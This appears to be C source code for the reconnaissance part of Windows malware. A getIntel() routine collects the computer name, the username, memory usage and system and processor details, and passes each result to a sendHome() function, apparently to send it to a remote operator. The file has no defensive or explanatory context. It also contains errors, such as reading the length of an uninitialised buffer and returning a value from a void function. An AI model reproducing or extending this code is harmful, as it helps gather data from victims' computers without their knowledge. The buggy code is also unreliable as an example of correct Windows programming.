#include "config.h"

void getIntel()
{
	getUserInfo();
	getMemoryUsage();
	getSystemInfo();
}

void getUserInfo()
{
	TCHAR buffer[256], temp[256], temp2[256];
	char string[256];

	DWORD bufferSize = _tcslen(temp);
	size_t sizeConverted;

	GetComputerName(temp, &bufferSize);
	_stprintf_s(buffer, 256, _T("Computer name:   %s\n"), temp);
	GetUserName(temp, &bufferSize);
	_stprintf_s(temp2, 256, _T("Username:        %s\n"), temp);
	StringCchCat(buffer, 256, temp2);

	wcstombs_s(&sizeConverted, string, 256, buffer, 256);
	sendHome(string);

	return 0;
}

void getMemoryUsage()
{
	TCHAR buffer[256];
	TCHAR temp[256];
	char string[256];
	size_t sizeConverted;
	MEMORYSTATUSEX memory;

	memory.dwLength = sizeof(memory);
	GlobalMemoryStatusEx(&memory);

	double totalMem  = (memory.ullTotalPhys / DIV);
	double totalPage = (memory.ullTotalPageFile / DIV);
	double totalVMem = (memory.ullTotalVirtual / DIV);

	double usedMem   = (memory.ullTotalPhys / DIV) - (memory.ullAvailPhys / DIV);
	double usedPage  = (memory.ullTotalPageFile / DIV) - (memory.ullAvailPageFile / DIV);
	double usedVMem  = (memory.ullTotalVirtual / DIV) - (memory.ullAvailVirtual / DIV);

	_stprintf_s(buffer, 256, _T("Memory Usage:    %*ld%% GB\n"), 1, memory.dwMemoryLoad);
	_stprintf_s(temp, 256, _T("Physical Memory: %.2f/%.2f GB\n"), usedMem / 100, totalMem / 100);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Paging File:     %.2f/%.2f GB\n"), usedPage / 100, totalPage / 100);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Virtual Memory:  %.2f/%.2f GB\n"), usedVMem / 100, totalVMem / 100);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Extended Memory: %*I64d GB \n"), 1, memory.ullAvailExtendedVirtual / DIV);
	StringCchCat(buffer, 256, temp);

	wcstombs_s(&sizeConverted, string, 256, buffer, 256);
	sendHome(string);
}

void getSystemInfo()
{
	TCHAR buffer[256], temp[256];
	char string[256];
	size_t sizeConverted;
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);

	_stprintf_s(buffer, 256, _T("OEM ID:          %u\n"), systemInfo.dwOemId);
	_stprintf_s(temp, 256, _T("# of processors: %u\n"), systemInfo.dwNumberOfProcessors);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Page size:       %u\n"), systemInfo.dwPageSize);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Processor type:  %u\n"), systemInfo.dwProcessorType);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Min app address: %lx\n"), systemInfo.lpMinimumApplicationAddress);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Max app address: %lx\n"), systemInfo.lpMaximumApplicationAddress);
	StringCchCat(buffer, 256, temp);
	_stprintf_s(temp, 256, _T("Active processor mask: %u\n"), systemInfo.dwActiveProcessorMask);
	StringCchCat(buffer, 256, temp);

	wcstombs_s(&sizeConverted, string, 256, buffer, 256);
	sendHome(string);
}